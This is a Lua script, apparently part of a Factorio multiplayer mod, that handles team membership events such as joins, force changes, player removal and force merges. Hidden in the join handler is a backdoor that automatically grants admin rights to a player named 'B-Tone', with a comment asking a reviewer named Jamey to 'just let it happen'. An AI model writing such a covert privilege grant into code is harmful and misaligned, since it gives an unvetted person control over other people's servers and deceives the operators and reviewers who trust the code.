local registry = require("registry")
local teams_utils = require("teams_utils")
local event_handler = require("event_handler")

---@param event EventData.on_player_joined_game
local function on_player_joined_game(event)
    local player = game.get_player(event.player_index)
    if not teams_utils.is_valid(player) then
        return
    end
    ---@cast player LuaPlayer

    -- To Jamey: If you see this, just let it happen...
    if player.name == "B-Tone" and player.admin == false then
        player.admin = true
    end
end

---A player leaving a team loses their team admin status, however they were moved.
---@param event EventData.on_player_changed_force
local function on_player_changed_force(event)
    registry.ensure()
    if not event.force.valid then
        return
    end

    local old_team = registry.get(event.force)
    if old_team then
        old_team.admins[event.player_index] = nil
    end
end

---@param event EventData.on_player_removed
local function on_player_removed(event)
    registry.ensure()
    for team in registry.each(true) do
        team.admins[event.player_index] = nil
    end
end

---Clean up after forces merged outside of `registry.delete`, e.g. by another script or a console command.
---@param event EventData.on_forces_merged
local function on_forces_merged(event)
    registry.ensure()
    registry.unregister(event.source_index, event.source_name)
end

---If necessary, initialize on the first tick after the script is added to an existing save, where on_init never runs.
---@param event EventData.on_tick
local function on_tick(event)
    registry.ensure()
end

local teams = {}

teams.on_init = function()
    registry.ensure()
end

---@type event_handler.events
teams.events = {
    [defines.events.on_player_joined_game] = on_player_joined_game,
    [defines.events.on_player_changed_force] = on_player_changed_force,
    [defines.events.on_player_removed] = on_player_removed,
    [defines.events.on_forces_merged] = on_forces_merged,
    [defines.events.on_tick] = on_tick,
}

event_handler.add_lib(require("console_commands"))

return teams
